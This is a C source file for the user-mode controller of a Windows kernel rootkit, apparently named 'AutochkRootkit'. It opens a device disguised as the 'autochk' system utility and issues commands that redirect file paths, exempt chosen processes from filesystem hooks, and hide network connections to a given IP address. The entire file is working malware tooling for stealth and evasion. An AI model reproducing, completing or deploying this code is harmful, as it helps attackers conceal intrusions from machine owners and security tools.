#include <Windows.h>
#include <winioctl.h>
#include <AutochkRootkit/Ioctl.h>
#include <stdio.h>
#include <ip2string.h>
#include <winternl.h>

int CmdFsAddFileRedirection(int argc, const char** argv);
int CmdFsAddIgnoredProcess(int argc, const char** argv);
int CmdNetHideIp(int argc, const char** argv);

int main(int argc, const char** argv)
{
	if (argc < 2)
	{
		fprintf(stderr, "Missing Command Argument. (redirect-file, fs-ignore-process, hide-ip)\n");
		return -1;
	}

	const char* cmd = argv[1];

	if (!strcmp(cmd, "redirect-file"))
	{
		return CmdFsAddFileRedirection(argc, argv);
	}
	else if (!strcmp(cmd, "fs-ignore-process"))
	{
		return CmdFsAddIgnoredProcess(argc, argv);
	}
	else if (!strcmp(cmd, "hide-ip"))
	{
		return CmdNetHideIp(argc, argv);
	}
	else
	{
		fprintf(stderr, "Command Not Valid. (redirect-file, fs-ignore-process, hide-ip)\n");
		return -1;
	}	
}

HANDLE CreateDeviceHandle()
{
	HANDLE DeviceHandle = CreateFileA(
		"\\\\.\\autochk", 
		GENERIC_ALL, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);

	if (DeviceHandle == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "CreateDeviceHandle Failed. %d", GetLastError());
		return NULL;
	}

	return DeviceHandle;
}

int CmdFsAddFileRedirection(int argc, const char** argv)
{
	if (argc < 4)
	{
		fprintf(stderr, "Invalid parameters. redirect-file <source> <target>\n");
		return  -1;
	}

	HANDLE DeviceHandle = CreateDeviceHandle();

	if (!DeviceHandle)
		return -1;

	AUTOCHK_REDIRECTED_FILE RedirectionFile;
	DWORD BytesReturned;
	
	swprintf(RedirectionFile.SourceFilePath, sizeof(RedirectionFile.SourceFilePath), L"%hs", argv[2]);
	swprintf(RedirectionFile.TargetFilePath, sizeof(RedirectionFile.TargetFilePath), L"%hs", argv[3]);

	if (!DeviceIoControl(
			DeviceHandle,
			IOCTL_AUTOCHK_ADD_FILE_REDIRECTION,
			&RedirectionFile,
			sizeof(RedirectionFile),
			NULL,
			0,
			&BytesReturned,
			NULL
		))
	{
		fprintf(stderr, "DeviceIoControl Failed. %d", GetLastError());
		return -1;
	}

	return 0;
}

int CmdFsAddIgnoredProcess(int argc, const char** argv)
{
	if (argc < 3)
	{
		fprintf(stderr, "Invalid parameters. fs-ignore-process <process_image>\n");
		return  -1;
	}

	HANDLE DeviceHandle = CreateDeviceHandle();

	if (!DeviceHandle)
		return -1;
	
	DWORD BytesReturned;
	CHAR ProcessName[20];
	RtlZeroMemory(ProcessName, 20);

	if (strlen(argv[2]) > 19)
	{
		printf("Process name is too long. The maximum is 19 characters");
		return -1;
	}

	strcpy_s(ProcessName, 20, argv[2]);

	if (!DeviceIoControl(
		DeviceHandle,
		IOCTL_AUTOCHK_ADD_FS_IGNORED_PROCESS,
		ProcessName,
		20,
		NULL,
		0,
		&BytesReturned,
		NULL
	))
	{
		fprintf(stderr, "DeviceIoControl Failed. %d", GetLastError());
		return -1;
	}

	return 0;
}

int CmdNetHideIp(int argc, const char** argv)
{
	HANDLE DeviceHandle;
	DWORD BytesReturned;
	IN_ADDR IpAddressBinary;
	PCSTR Term;
	NTSTATUS Status;
	AUTOCHK_HIDDEN_CONNECTION HiddenConnection = { 0 };

	if (argc < 3)
	{
		fprintf(stderr, "Missing Parameters For hide-ip (<ip>)\n");
	}

	DeviceHandle = CreateDeviceHandle();
	
	if (!DeviceHandle)
	{
		return -1;
	}
	
	Status = RtlIpv4StringToAddressA(argv[2], TRUE, &Term, &IpAddressBinary);
	
	if (!NT_SUCCESS(Status))
	{
		fprintf(stderr, "Could not parse ipv4 address\n");
		return -1;
	}

	HiddenConnection.IpAddress = IpAddressBinary.s_addr;

	if (!DeviceIoControl(
		DeviceHandle,
		IOCTL_AUTOCHK_ADD_HIDDEN_CONNECTION,
		&HiddenConnection,
		sizeof(AUTOCHK_HIDDEN_CONNECTION),
		NULL,
		0,
		&BytesReturned,
		NULL
	))
	{
		fprintf(stderr, "DeviceIoControl Failed. %d", GetLastError());
		return -1;
	}
	
	return 0;

}